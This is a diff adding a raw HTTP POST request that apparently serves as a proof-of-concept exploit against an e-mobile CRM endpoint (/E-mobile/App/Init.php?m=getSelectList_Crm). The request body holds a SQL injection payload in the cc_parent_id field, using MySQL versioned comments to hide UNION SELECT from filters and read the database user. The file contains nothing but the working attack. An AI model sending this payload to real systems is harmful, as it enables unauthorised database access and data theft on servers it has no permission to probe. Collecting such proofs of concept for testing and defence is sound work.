@@ -1,0 +1,9 @@
+POST /E-mobile/App/Init.php?m=getSelectList_Crm HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Length: 60
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+
+cc_parent_id=-999 /*!50000union*/ /*!50000select*/ 1,user()#
